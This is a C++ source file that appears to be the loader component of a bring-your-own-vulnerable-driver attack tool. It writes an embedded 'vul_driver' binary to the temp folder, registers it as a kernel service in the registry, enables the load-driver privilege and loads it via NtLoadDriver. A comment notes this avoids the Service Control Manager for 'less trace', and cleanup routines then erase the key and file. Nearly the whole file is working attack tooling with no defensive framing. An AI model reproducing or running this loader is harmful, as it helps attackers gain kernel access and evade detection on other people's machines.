#include "vul_driver.h"

namespace vul_driver
{
  auto get_full_driver_path() -> std::wstring
  {
    const std::wstring temp_path = utils::get_temp_path();
    if (temp_path.empty())
    {
      std::cerr << "couldn't get temp path" << std::endl;
      return L"";
    }
    return temp_path + driver_name + L".sys";
  }

  auto install_driver() -> BOOL
  {
    const std::wstring full_driver_path = get_full_driver_path();
    if (full_driver_path.empty())
    {
      std::cerr << "couldn't get full driver path" << std::endl;
      return FALSE;
    }
    // check if the driver already exists
    std::filesystem::path path(full_driver_path);
    if (std::filesystem::exists(path))
    {
      const int status = _wremove(full_driver_path.c_str());
      if (status != 0)
      {
        std::cerr << "something goes wrong with _wremove" << std::endl;
        return FALSE;
      }
    }

    std::ofstream sys_file(full_driver_path, std::ios::out | std::ios::binary);
    if (!sys_file)
    {
      std::cerr << "couldn't create file for writing the driver" << std::endl;
      return FALSE;
    }
    sys_file.write(reinterpret_cast<const char*>(echo_driver_resource::driver), sizeof(echo_driver_resource::driver));
    sys_file.close();
    return TRUE;
  }


  // returns if reg_open_key_ex succeeded and the status.
  auto does_reg_key_exist(HKEY h_key_root, LPCWSTR sub_key) -> std::pair<bool, LSTATUS>
  {
    HKEY h_key;
    LSTATUS status = RegOpenKeyExW(h_key_root, sub_key, 0, KEY_READ, &h_key);

    if (status != ERROR_SUCCESS)
    {
      return {false, status}; // Failed to open the key
    }

    RegCloseKey(h_key);
    return {true, status}; // Successfully opened and closed the key
  }


  auto setup_reg_key() -> BOOL
  {
    const std::wstring services_path = SERVICE_PATH_COMMON + driver_name;
    const HKEY h_key_root = HKEY_LOCAL_MACHINE;

    if (auto [result, status] = does_reg_key_exist(h_key_root, services_path.c_str()); result)
    {
      std::cerr << "service key already exists" << std::endl;
      return FALSE;
    }

    HKEY h_service;
    if (RegCreateKeyW(h_key_root, services_path.c_str(), &h_service) != ERROR_SUCCESS)
    {
      std::cerr << "couldn't create service key" << std::endl;
      return FALSE;
    }
    const std::wstring global_namespace_driver_path = L"\\??\\" + get_full_driver_path();
    //set image path first
    const LSTATUS status = RegSetKeyValueW(h_service, NULL, L"ImagePath", REG_EXPAND_SZ,
                                           global_namespace_driver_path.c_str(),
                                           // wchar has double size of char
                                           (DWORD)(global_namespace_driver_path.size() * sizeof(wchar_t)));
    if (status != ERROR_SUCCESS)
    {
      RegCloseKey(h_service);
      std::cerr << "couldn't set ImagePath value" << std::endl;
      return FALSE;
    }

    const DWORD dwTypeValue = SERVICE_KERNEL_DRIVER;
    // set Type to service
    RegSetKeyValueW(h_service, NULL, L"Type", REG_DWORD, &dwTypeValue, sizeof(DWORD));
    if (status != ERROR_SUCCESS)
    {
      RegCloseKey(h_service);
      std::cerr << "couldn't set Type" << std::endl;
      return FALSE;
    }

    RegCloseKey(h_service);
    return TRUE;
  }

  auto load_driver() -> BOOL
  {
    HMODULE ntdll = utils::get_ntdll();
    if (!ntdll)
    {
      std::cerr << "couldn't get ntdll handle" << std::endl;
      return FALSE;
    }
    const auto RtlAdjustPrivilege = reinterpret_cast<utils::RtlAdjustPrivilege>(GetProcAddress(
      ntdll, "RtlAdjustPrivilege"));
    const auto NtLoadDriver = reinterpret_cast<utils::NtLoadDriver>(GetProcAddress(ntdll, "NtLoadDriver"));
    if (!RtlAdjustPrivilege || !NtLoadDriver)
    {
      std::cerr << "couldn't get ntdll functions" << std::endl;
      return FALSE;
    }

    BOOLEAN old = FALSE;
    NTSTATUS status = RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &old);
    if (!NT_SUCCESS(status))
    {
      std::cerr << "couldn't adjust privilege " << "NTSTATUS is: " << std::hex << status << std::endl;
      return FALSE;
    }

    std::wstring wdriver_reg_path = L"\\Registry\\Machine\\" + SERVICE_PATH_COMMON + driver_name;
    UNICODE_STRING service_path;
    RtlInitUnicodeString(&service_path, wdriver_reg_path.c_str());

    // when you load your driver with NtLoadDriver, it won't be registered with the Service Control Manager (SCM). Less trace.
    status = NtLoadDriver(&service_path);
    // 0xC000010E is STATUS_IMAGE_ALREADY_LOADED
    if (status == 0xC000010E)
    {
      std::cout << "driver already loaded" << std::endl;
      return TRUE;
    }
    else if (!NT_SUCCESS(status))
    {
      std::cerr << "couldn't load driver " << "NTSTATUS is: " << std::hex << status << std::endl;;
      return FALSE;
    }
    return TRUE;
  }

  // Unloads driver, deletes the registry key and the driver file.
  auto cleanup_reg_driver() -> BOOL
  {
    auto [result, status] = does_reg_key_exist(HKEY_LOCAL_MACHINE, (SERVICE_PATH_COMMON + driver_name).c_str());
    if (!result)
    {
      if (status == ERROR_FILE_NOT_FOUND)
      {
        return TRUE;
      }
      std::cerr << "cleanup: key cannot be opened correctly" << std::endl;
      return FALSE;
    }
    BOOL st = unload_driver();
    if (!st)
    {
      std::cerr << "cleanup: unloading driver failed" << std::endl;
      return FALSE;
    }

    st = delete_reg_key(HKEY_LOCAL_MACHINE, (SERVICE_PATH_COMMON + driver_name).c_str());
    if (!st)
    {
      std::cerr << "cleanup: deleting key failed" << std::endl;
      return FALSE;
    }

    int ok = _wremove(get_full_driver_path().c_str());
    if (ok != 0)
    {
      std::cerr << "cleanup: deleting driver file failed" << std::endl;
      return FALSE;
    }

    return TRUE;
  }

  auto delete_reg_key(HKEY h_key_root, LPCWSTR sub_key) -> BOOL
  {
    const LSTATUS status = RegDeleteTreeW(h_key_root, sub_key);
    if (status != ERROR_SUCCESS)
    {
      std::cerr << "couldn't delete service key" << std::endl;
      return FALSE;
    }
    return TRUE;
  }

  auto unload_driver() -> BOOL
  {
    const auto ntdll = utils::get_ntdll();
    if (!ntdll)
    {
      std::cerr << "couldn't get ntdll handle" << std::endl;
      return FALSE;
    }

    std::wstring wdriver_reg_path = L"\\Registry\\Machine\\" + SERVICE_PATH_COMMON + driver_name;
    UNICODE_STRING service_path;
    RtlInitUnicodeString(&service_path, wdriver_reg_path.c_str());

    const auto NtUnloadDriver = reinterpret_cast<utils::NtUnloadDriver>(GetProcAddress(ntdll, "NtUnloadDriver"));
    NTSTATUS status = NtUnloadDriver(&service_path);
    if (status != 0x0)
    {
      std::cerr << "couldn't unload driver " << "NTSTATUS is: " << std::hex << status << std::endl;
      delete_reg_key(HKEY_LOCAL_MACHINE, (SERVICE_PATH_COMMON + driver_name).c_str());
      return FALSE;
    }

    return TRUE;
  }
}
